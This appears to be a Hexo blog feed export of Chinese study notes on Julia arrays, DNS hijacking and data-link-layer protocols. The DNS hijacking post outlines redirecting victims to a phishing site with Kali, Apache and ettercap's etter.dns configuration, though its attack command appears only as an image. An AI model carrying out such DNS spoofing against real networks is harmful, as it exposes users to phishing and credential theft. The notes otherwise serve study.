<p><strong>注意：</strong>第一行输出的 <strong>2×2 Matrix{Int64}:</strong>，2×2 表示两行两列的矩阵。<br>我们也可以在方括号 <strong>[]</strong> 中嵌入多个长度相同的一维数组，并用空格分隔来创建二维数组：</p>
<p><img src="/2023/01/30/julia/image-20230130121234288.png" alt="image-20230130121234288"></p>
<p><strong>2x3</strong> 表示两行三列的数组。<br>下面我们通过灵活运用分号 <strong>;</strong> 和空格  创建一个两行三列和三行两列的二维数组：</p>
<p><img src="/2023/01/30/julia/image-20230130121355607.png" alt="image-20230130121355607"></p>
<p>可以看到，在矩阵中，<strong>;</strong>意味着换行</p>
<h2 id="使用范围函数来创建数组"><a href="#使用范围函数来创建数组" class="headerlink" title="使用范围函数来创建数组"></a>使用范围函数来创建数组</h2><h3 id="省略号…"><a href="#省略号…" class="headerlink" title="省略号…"></a>省略号…</h3><p><img src="/2023/01/30/julia/image-20230130121648639.png" alt="image-20230130121648639"></p>
<h3 id="collect-函数"><a href="#collect-函数" class="headerlink" title="collect()函数"></a>collect()函数</h3><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">collect(element_type,start:step:stop)</span><br></pre></td></tr></table></figure>
<p>element_type为数据类型，start为开始值，step为步长，stop为结束值。该函数返回数组。</p>
<p><img src="/2023/01/30/julia/image-20230130123945023.png" alt="image-20230130123945023"><img src="/2023/01/30/julia/image-20230130124001687.png" alt="image-20230130124001687"></p>
<p>创建一个浮点型数组</p>
<p><img src="/2023/01/30/julia/image-20230130124730690.png" alt="image-20230130124730690"></p>
<h3 id="range-函数"><a href="#range-函数" class="headerlink" title="range()函数"></a>range()函数</h3><p>range() 函数可以生存一个区间范围并指定步长，可以方便 collect() 函数 调用。range() 函数语法格式如下：<br>range(start, stop, length) range(start, stop; length, step) range(start; length, stop, step) range(;start, length, stop, step)<br>start 为开始值，step 为步长，stop 为结束值，length 为长度。</p>
<p><img src="/2023/01/30/julia/image-20230130130603394.png" alt="image-20230130130603394"></p>
<p>如果未指定长度length，且stop-start不是step的整数倍，则将生成在stop之前结束的范围</p>
<p><img src="/2023/01/30/julia/image-20230130130828796.png" alt="image-20230130130828796"></p>
<p>使用range()和collect()创建数组</p>
<p><img src="/2023/01/30/julia/image-20230130131031598.png" alt="image-20230130131031598"></p>
<p>使用推导式和生成器创建数组</p>
<p>创建数组的另一种有用方法是使用推导。数组推导式语法格式如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">A = [ F(x,y,<span class="built_in">..</span>.) <span class="keyword">for</span> <span class="attribute">x</span>=rx, <span class="attribute">y</span>=ry, <span class="built_in">..</span>. ]</span><br></pre></td></tr></table></figure>
<p>F(x,y,…) 取其给定列表中变量 x，y 等的每个值进行计算。值可以指定为任何可迭代对象，但通常是 1:n 或 2:(n-1) 之类的范围，或者像 [1.2, 3.4, 5.7] 这样的显式数组值。结果是一个 N 维密集数组，将变量范围 rx，ry 等的维数拼接起来得到其维数，并且每次 F(x,y,…) 计算返回一个标量。</p>
<p><img src="/2023/01/30/julia/image-20230130131602843.png" alt="image-20230130131602843"></p>
<p>创建二维数组</p>
<p><img src="/2023/01/30/julia/image-20230130131658616.png" alt="image-20230130131658616"></p>
<p>创建数组和求和</p>
<p><img src="/2023/01/30/julia/image-20230130131823703.png" alt="image-20230130131823703"></p>
<p>基本函数</p>
<p><img src="/2023/01/30/julia/image-20230130132252096.png" alt="image-20230130132252096"></p>
<p>eltype(A)：A中元素的类型<br><img src="/2023/01/30/julia/image-20230130132427217.png" alt="image-20230130132427217"></p>
<p>length(A)：A中元素的数量<br><img src="/2023/01/30/julia/image-20230130132542476.png" alt="image-20230130132542476"></p>
<p>ndims(A)：A的维数<br><img src="/2023/01/30/julia/image-20230130132727871.png" alt="image-20230130132727871"></p>
<p>size(A)：一个包含A各个维度上元素数量的元组<br><img src="/2023/01/30/julia/image-20230130132843939.png" alt="image-20230130132843939"></p>
<p>size(A,n)：A第n维中的元素数量<br><img src="/2023/01/30/julia/image-20230130133005666.png" alt="image-20230130133005666"></p>
<p>axes(A)：一个包含A有效索引的元组<br><img src="/2023/01/30/julia/image-20230130133400344.png" alt="image-20230130133400344"></p>
<p>axes(A,n)：第n维有效索引的范围<br><img src="/2023/01/30/julia/image-20230130133338454.png" alt="image-20230130133338454"></p>
<p>eachindex(A):一个访问A中每一个位置的高效迭代器<br><img src="/2023/01/30/julia/image-20230130133705581.png" alt="image-20230130133705581"><br><img src="/2023/01/30/julia/image-20230130133738104.png" alt="image-20230130133738104"></p>
<p>stride(A,k)：第k维上的间隔（相邻元素间的线性索引距离）<br>strides(A)：包含每一个维上的间隔的元组<br><img src="/2023/01/30/julia/image-20230130134737685.png" alt="image-20230130134737685"></p>
<p>Julia构造和初始化</p>
<p>Julia 提供了许多用于构造和初始化数组的函数。在下列函数中，参数 dims … 可以是一个元组 tuple 来表示维数，也可以是一个可变长度的整数值作为维数。大部分函数的第一个参数都表示数组的元素类型 T 。如果类型 T 被省略，那么将默认为 Float64。</p>
<p>Array{T}(undef,dims…)：一个没有初始化的密集Array<br><img src="/2023/01/30/julia/image-20230130161838694.png" alt="image-20230130161838694"></p>
<p>zeros(T,dims…)：一个全零Array<br><img src="/2023/01/30/julia/image-20230130161957271.png" alt="image-20230130161957271"><img src="/2023/01/30/julia/image-20230130162009554.png" alt="image-20230130162009554"></p>
<p>ones(T,dims…)：一个元素均为1的Array<br><img src="/2023/01/30/julia/image-20230130162145462.png" alt="image-20230130162145462"><img src="/2023/01/30/julia/image-20230130162159907.png" alt="image-20230130162159907"></p>
<p>trues(dims…)和falses(dims…)：一个每个元素都为true的BitArray<br><img src="/2023/01/30/julia/image-20230130162333850.png" alt="image-20230130162333850"><img src="/2023/01/30/julia/image-20230130162345274.png" alt="image-20230130162345274"></p>
<p>reshape(A,dims…)：一个包含跟A相同数据但维数不同的数组<br><img src="/2023/01/30/julia/image-20230130162828790.png" alt="image-20230130162828790" style="zoom:67%;"><img src="/2023/01/30/julia/image-20230130162924534.png" alt="image-20230130162924534" style="zoom:80%;"></p>
<p>copy(A)：拷贝A<br><img src="/2023/01/30/julia/image-20230130163037419.png" alt="image-20230130163037419"></p>
<p>deepcopy(A)：深拷贝，即拷贝A，并递归地拷贝其元素<br><img src="/2023/01/30/julia/image-20230130163737083.png" alt="image-20230130163737083"><br>深拷贝会使新变量与原变量地址不同</p>
<p>similar(A,T,dims…)：一个与<code>A</code>具有相同类型（这里指的是密集，稀疏等）的未初始化数组，但具有指定的元素类型和维数。第二个和第三个参数都是可选的，如果省略则默认为元素类型和 <code>A</code> 的维数。<br><img src="/2023/01/30/julia/image-20230130164201573.png" alt="image-20230130164201573"></p>
<p>reinterpret(T,A)：与A具有相同二进制数据的数组，但元素类型为T<br><img src="/2023/01/30/julia/image-20230130164742475.png" alt="image-20230130164742475"></p>
<p>rand(T,dims…)：一个随机 <code>Array</code>，元素值是 [0,1)[0,1) 半开区间中的均匀分布且服从一阶独立同分布<br><img src="/2023/01/30/julia/image-20230130165422957.png" alt="image-20230130165422957"><br><img src="/2023/01/30/julia/image-20230130165440922.png" alt="image-20230130165440922"><br><img src="/2023/01/30/julia/image-20230130165551400.png" alt="image-20230130165551400"><br><img src="/2023/01/30/julia/image-20230130165817415.png" alt="image-20230130165817415"><br><img src="/2023/01/30/julia/image-20230130171130482.png" alt="image-20230130171130482"></p>
<p>randn(T,dims…)：一个随机Array，元素为标准正态分布，服从独立同分布<br><img src="/2023/01/30/julia/image-20230130171249100.png" alt="image-20230130171249100"></p>
<p>fill!(A,x)：用值x填充数组A<br><img src="/2023/01/30/julia/image-20230130171755602.png" alt="image-20230130171755602"></p>
<p>fill(x,dims…)：一个被值x填充的Array<br><img src="/2023/01/30/julia/image-20230130171920200.png" alt="image-20230130171920200"></p>
<p>Julia元组</p>
]]></content>
      <tags>
        <tag>编程语言</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS劫持</title>
    <url>/2023/01/04/DNS%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>DNS劫持相关知识点以及攻击流程</p>
<span id="more"></span>
<p>DNS域名服务器</p>
<p>www.loveakali.top<br>根域：.  浏览器会自动添加<br>顶级域名(一级域名)：.com    .cn    .org    .edu<br>二级域名：.loveakali<br>主机名：www</p>
<p>因为服务器存在承载上限，所以当DNS服务器解析域名失败，DNS服务器就会发送给根域服务器（全世界就13台），然后转到一级域名服务器，然后转到二级域名服务器</p>
<p>第二次访问比第一次访问块<br>电脑中有host文件用于缓存最近访问的网站</p>
<p>黑客攻击思路：<br>在提交域名至DNS服务器过程中用假的DNS服务器拦截下来，返回一个假的ip地址（该ip网站为搭建的钓鱼网站）</p>
<p>工具：<br>kali<br>钓鱼网站    部署后使受害人通过ip地址访问    apache<br>ettercap： etter.dns  配置文件  1.劫持网站是哪个？2.返回的ip地址是哪个</p>
<p>dns解析方式：1.正向解析 域名解析ip地址    2.反向解析  ip地址解析域名<br>www.jd.com A IP         A    正向解析<br>www.jd.com PTR IP        PTR    反向解析</p>
<p>3.发动攻击的指令<br><img src="/2023/01/04/DNS%E5%8A%AB%E6%8C%81/image-20230104205539092-16728369399071.png" alt="image-20230104205539092"></p>
<p>清楚缓存ipconfig /flushdns<br><img src="/2023/01/04/DNS%E5%8A%AB%E6%8C%81/image-20230104205955172.png" alt="image-20230104205955172"></p>
<p>攻略<br>1.ip地址   扫描<br>2.缓存    DNS劫持    木马    系统命令</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>链路层</title>
    <url>/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104093550972.png" alt="image-20230104093550972"></p>
<span id="more"></span>
<h1 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h1><p>帧：链路层的协议数据单元，封装网络层数据报</p>
<p>数据链路层负责通过一条链路从一个结点向另一个物理链路直接相连的相邻结点传送数据报。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104094524368.png" alt="image-20230104094524368"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104094947249.png" alt="image-20230104094947249"></p>
<h1 id="封装成帧和透明传输"><a href="#封装成帧和透明传输" class="headerlink" title="封装成帧和透明传输"></a>封装成帧和透明传输</h1><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095341372.png" alt="image-20230104095341372"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095400187.png" alt="image-20230104095400187"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095454024.png" alt="image-20230104095454024"></p>
<h2 id="字符计数法"><a href="#字符计数法" class="headerlink" title="字符计数法"></a>字符计数法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104095658063.png" alt="image-20230104095658063"></p>
<h2 id="字符填充法"><a href="#字符填充法" class="headerlink" title="字符填充法"></a>字符填充法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100227855.png" alt="image-20230104100227855"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100103889.png" alt="image-20230104100103889"><br>SOH：帧首部    EOT：帧尾部    ESC：转义</p>
<h2 id="零比特填充法"><a href="#零比特填充法" class="headerlink" title="零比特填充法"></a>零比特填充法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100517452.png" alt="image-20230104100517452"></p>
<h2 id="违规编码法"><a href="#违规编码法" class="headerlink" title="违规编码法"></a>违规编码法</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100618192.png" alt="image-20230104100618192"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104100653127.png" alt="image-20230104100653127"></p>
<h1 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h1><h2 id="检错编码"><a href="#检错编码" class="headerlink" title="检错编码"></a>检错编码</h2><p>概括来说，传输中的产错都是由于噪声引起的</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104101040816.png" alt="image-20230104101040816"></p>
<h3 id="奇偶校验码"><a href="#奇偶校验码" class="headerlink" title="奇偶校验码"></a>奇偶校验码</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104101414072.png" alt="image-20230104101414072"></p>
<p>特点：只能检查出奇数个/偶数个比特错误，检错能力为50%</p>
<h3 id="CRC循环冗余码"><a href="#CRC循环冗余码" class="headerlink" title="CRC循环冗余码"></a>CRC循环冗余码</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104101827049.png" alt="image-20230104101827049"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104102231091.png" alt="image-20230104102231091"></p>
<p>链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输</p>
<h2 id="纠错编码"><a href="#纠错编码" class="headerlink" title="纠错编码"></a>纠错编码</h2><h3 id="海明码"><a href="#海明码" class="headerlink" title="海明码"></a>海明码</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104103317367.png" alt="image-20230104103317367"></p>
<h4 id="海明距离"><a href="#海明距离" class="headerlink" title="海明距离"></a>海明距离</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104103544956.png" alt="image-20230104103544956"></p>
<p>如果要检错n位，那么码距至少需要n+1；如果要纠错n位，那么码距至少需要2n+1</p>
<h4 id="确认校验码位数r"><a href="#确认校验码位数r" class="headerlink" title="确认校验码位数r"></a>确认校验码位数r</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104104354024.png" alt="image-20230104104354024"></p>
<h4 id="确定校验码和数据的位置"><a href="#确定校验码和数据的位置" class="headerlink" title="确定校验码和数据的位置"></a>确定校验码和数据的位置</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104104522452.png" alt="image-20230104104522452"></p>
<h4 id="求出校验码的值"><a href="#求出校验码的值" class="headerlink" title="求出校验码的值"></a>求出校验码的值</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104104839066.png" alt="image-20230104104839066"></p>
<h4 id="检错并纠错"><a href="#检错并纠错" class="headerlink" title="检错并纠错"></a>检错并纠错</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104105305926.png" alt="image-20230104105305926"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104105758249.png" alt="image-20230104105758249" style="zoom:80%;"><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104105815615.png" alt="image-20230104105815615"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104110106371.png" alt="image-20230104110106371"></p>
<h1 id="可靠传输机制和流量控制"><a href="#可靠传输机制和流量控制" class="headerlink" title="可靠传输机制和流量控制"></a>可靠传输机制和流量控制</h1><h2 id="数据链路层的流量控制"><a href="#数据链路层的流量控制" class="headerlink" title="数据链路层的流量控制"></a>数据链路层的流量控制</h2><p>较高的发送速度和较低的接受能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p>
<p>数据链路层的流量控制是点对点的，而传输层的流量控制是端到端的。</p>
<p>数据链路层流量控制手段：接收方收不下就不回复确认。<br>传输层流量控制手段：接收端给发送端一个窗口公告。</p>
<h2 id="流量控制方法"><a href="#流量控制方法" class="headerlink" title="流量控制方法"></a>流量控制方法</h2><h3 id="停止-等待协议"><a href="#停止-等待协议" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111257417.png" alt="image-20230104111257417" style="zoom:80%;"></p>
<h3 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111435875.png" alt="image-20230104111435875" style="zoom:80%;"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111457317.png" alt="image-20230104111457317"><br>每收到一个发送帧，接收后接受窗口前进一格；每收到一个确认帧，发送窗口前进一格</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104111711422.png" alt="image-20230104111711422"></p>
<p>在链路层中，再发送过程中窗口大小固定。传输层中会出现不固定的窗口大小</p>
<h3 id="可靠传输、滑动窗口、流量控制"><a href="#可靠传输、滑动窗口、流量控制" class="headerlink" title="可靠传输、滑动窗口、流量控制"></a>可靠传输、滑动窗口、流量控制</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104113939833.png" alt="image-20230104113939833"></p>
<h1 id="停止-等待协议-1"><a href="#停止-等待协议-1" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h1><ul>
<li>为什么要有停止-等待协议</li>
</ul>
<p>除了比特出差错，底层信道还会出现丢包问题。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104123626366.png" alt="image-20230104123626366"><br>为了实现流量控制</p>
<h2 id="无差错情况"><a href="#无差错情况" class="headerlink" title="无差错情况"></a>无差错情况</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104124018565.png" alt="image-20230104124018565"></p>
<h2 id="有差错情况"><a href="#有差错情况" class="headerlink" title="有差错情况"></a>有差错情况</h2><h3 id="数据帧丢失或检测到帧出错"><a href="#数据帧丢失或检测到帧出错" class="headerlink" title="数据帧丢失或检测到帧出错"></a>数据帧丢失或检测到帧出错</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104153704307.png" alt="image-20230104153704307"></p>
<ol>
<li>发完一个帧后，必须保留他的副本</li>
<li>数据帧和确认帧必须编号</li>
</ol>
<h3 id="ACK丢失"><a href="#ACK丢失" class="headerlink" title="ACK丢失"></a>ACK丢失</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154038945.png" alt="image-20230104154038945"></p>
<h3 id="ACK迟到"><a href="#ACK迟到" class="headerlink" title="ACK迟到"></a>ACK迟到</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154157316.png" alt="image-20230104154157316"></p>
<h2 id="停止-等待协议性能分析"><a href="#停止-等待协议性能分析" class="headerlink" title="停止-等待协议性能分析"></a>停止-等待协议性能分析</h2><p>信道利用率太低<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154502646.png" alt="image-20230104154502646"><br>$T_D：发送时延    RTT：往返时延    T_A：确认帧的发送时延$</p>
<h3 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h3><p>发送方在一个发送周期内，有效地发送数据所需要的时间占整个发送周期的比率</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154831369.png" alt="image-20230104154831369" style="zoom:80%;"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104154909126.png" alt="image-20230104154909126"></p>
<h1 id="后退N帧协议-GBN"><a href="#后退N帧协议-GBN" class="headerlink" title="后退N帧协议(GBN)"></a>后退N帧协议(GBN)</h1><p>发送窗口：发送方维持一组连续的允许发送帧的序号<br>接收窗口：接收方维持一组连续的允许接受帧的序号</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104155839209.png" alt="image-20230104155839209"></p>
<h3 id="发送方需要做的事情"><a href="#发送方需要做的事情" class="headerlink" title="发送方需要做的事情"></a>发送方需要做的事情</h3><ol>
<li>上层的调用<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104160608420.png" alt="image-20230104160608420"></li>
<li>收到一个ACK<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104160749701-16728196709461.png" alt="image-20230104160749701"></li>
<li>超时事件<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104160910082.png" alt="image-20230104160910082"></li>
</ol>
<h3 id="接收方要做的事情"><a href="#接收方要做的事情" class="headerlink" title="接收方要做的事情"></a>接收方要做的事情</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104161201358.png" alt="image-20230104161201358"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104161237840.png" alt="image-20230104161237840"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104161422614.png" alt="image-20230104161422614"></p>
<h3 id="滑动窗口长度"><a href="#滑动窗口长度" class="headerlink" title="滑动窗口长度"></a>滑动窗口长度</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104162029634.png" alt="VBV"></p>
<h3 id="GBN协议重点总结"><a href="#GBN协议重点总结" class="headerlink" title="GBN协议重点总结"></a>GBN协议重点总结</h3><ol>
<li>累积确认（偶尔捎带确认）</li>
<li>接收方只按顺序接受帧，不按序无情丢弃</li>
<li>确认序列号最大的、按序到达的帧</li>
<li>发送窗口最大为2^n^-1，接收窗口大小为1</li>
</ol>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104162530402.png" alt="image-20230104162530402">C<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104163911236.png" alt="image-20230104163911236"><br>C</p>
<h3 id="GBN协议性能分析"><a href="#GBN协议性能分析" class="headerlink" title="GBN协议性能分析"></a>GBN协议性能分析</h3><p>优点：因连续发送数据帧而提高了信道利用率</p>
<p>缺点：在重传时必须把原来已经正确传送的数据帧重传，传送效率降低（累计确认导致的问题）</p>
<h1 id="选择重传协议-SR"><a href="#选择重传协议-SR" class="headerlink" title="选择重传协议(SR)"></a>选择重传协议(SR)</h1><p>设置单个确认，同时加大接受窗口，设置接受缓存，缓存乱序到达的帧</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104164829412.png" alt="image-20230104164829412"></p>
<h2 id="发送方必须响应的三件事"><a href="#发送方必须响应的三件事" class="headerlink" title="发送方必须响应的三件事"></a>发送方必须响应的三件事</h2><ol>
<li>上层的调用<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104164914968.png" alt="image-20230104164914968"></li>
<li>收到了一个ACK<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104164939113.png" alt="image-20230104164939113"></li>
<li>超时事件<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104165134209.png" alt="image-20230104165134209"></li>
</ol>
<h2 id="接收方要做的事"><a href="#接收方要做的事" class="headerlink" title="接收方要做的事"></a>接收方要做的事</h2><p>来着不拒（窗口内的帧）<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104165210319.png" alt="image-20230104165210319"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104165503720.png" alt="image-20230104165503720"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104170847171.png" alt="image-20230104170847171"></p>
<h2 id="滑动窗口长度-1"><a href="#滑动窗口长度-1" class="headerlink" title="滑动窗口长度"></a>滑动窗口长度</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104171438113.png" alt="image-20230104171438113"></p>
<p>发送窗口最好等于接收窗口。</p>
<script type="math/tex; mode=display">
W_{Tmax}=W_{Rmax}=2^{n-1}</script><p>所以上面例子帧编号从0-3，所以$n=log_24=2$，所以发送窗口等于接收窗口=2</p>
<h2 id="重点总结"><a href="#重点总结" class="headerlink" title="重点总结"></a>重点总结</h2><ol>
<li>对数据帧逐一确认</li>
<li>只重传出错帧</li>
<li>接收方有缓存</li>
<li>$W_{Tmax}=W_{Rmax}=2^{n-1}$</li>
</ol>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104172451655.png" alt="image-20230104172451655"><br>A</p>
<h1 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h1><h2 id="静态划分信道——信道划分介质访问控制"><a href="#静态划分信道——信道划分介质访问控制" class="headerlink" title="静态划分信道——信道划分介质访问控制"></a>静态划分信道——信道划分介质访问控制</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104181434526.png" alt="image-20230104181434526"></p>
<p>广播式链路典型拓扑结构：总线型、星型（逻辑总线型） </p>
<p>采取一定的措施，使得两对结点之间的通信不会发生互相干扰的情况</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104190245754.png" alt="image-20230104190245754"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104190442391.png" alt="image-20230104190442391"></p>
<h3 id="频分多路复用FDM"><a href="#频分多路复用FDM" class="headerlink" title="频分多路复用FDM"></a>频分多路复用FDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104191105739.png" alt="image-20230104191105739"></p>
<h3 id="时分多路复用TDM"><a href="#时分多路复用TDM" class="headerlink" title="时分多路复用TDM"></a>时分多路复用TDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104191234014.png" alt="image-20230104191234014"></p>
<h3 id="统计时分复用STDM"><a href="#统计时分复用STDM" class="headerlink" title="统计时分复用STDM"></a>统计时分复用STDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104191545648.png" alt="image-20230104191545648"></p>
<p>类似队列，先进先出，满帧就走，按需分配</p>
<h3 id="波分多路复用WDM"><a href="#波分多路复用WDM" class="headerlink" title="波分多路复用WDM"></a>波分多路复用WDM</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104192215814.png" alt="image-20230104192215814"></p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104192225172.png" alt="image-20230104192225172"></p>
<h3 id="码分多路复用CDM"><a href="#码分多路复用CDM" class="headerlink" title="码分多路复用CDM"></a>码分多路复用CDM</h3><p>码分多址（CDMA)是码分复用的一种方式<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104192838892.png" alt="image-20230104192838892"></p>
<script type="math/tex; mode=display">
S:00011011\ 芯片序列：-1 -1 -1 +1 +1 -1 +1 +1\\T:00101110\ 芯片序列：-1 -1 +1 -1 +1 +1 +1 -1</script><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230104193433727.png" alt="image-20230104193433727"></p>
<h2 id="动态分配信道——随机访问介质访问控制"><a href="#动态分配信道——随机访问介质访问控制" class="headerlink" title="动态分配信道——随机访问介质访问控制"></a>动态分配信道——随机访问介质访问控制</h2><h3 id="纯ALOHA协议"><a href="#纯ALOHA协议" class="headerlink" title="纯ALOHA协议"></a>纯ALOHA协议</h3><p>思想：不监听信道，不按时间槽发送，随即重发。当网络中的任何一个站点需要发送数据时，可以不进行任何检测就发送数据。如果在一段时间内未收到确认，那么该站点就认为传输过程中发生了冲突。发送站点需要等待一段时间后再发送数据，直至发送成功。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105095601747.png" alt="image-20230105095601747"></p>
<h3 id="时隙ALOHA协议"><a href="#时隙ALOHA协议" class="headerlink" title="时隙ALOHA协议"></a>时隙ALOHA协议</h3><p>思想：把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发生冲突，则必须等到下一个时间片开始时刻再发送<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105095842071.png" alt="image-20230105095842071"></p>
<h4 id="重发概率的问题"><a href="#重发概率的问题" class="headerlink" title="重发概率的问题"></a>重发概率的问题</h4><p>如果有碰撞，该节点在时隙结束之前检测这次碰撞，该节点以概率p在后续的每个时隙中重传它的帧，直到该帧被无碰撞的传输出去。</p>
<p>以概率p重传，是指某节点有效地投掷一个有偏倚的硬币：硬币正面事件对应着重传，而重传出现的概率为p。硬币反面事件对应着“跳过这个时隙，在下个时隙在掷硬币”；这个事件以概率(1-p)出现。所有涉及碰撞的节点独立地投掷它们的硬币。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230105101417907.png" alt="image-20230105101417907"></p>
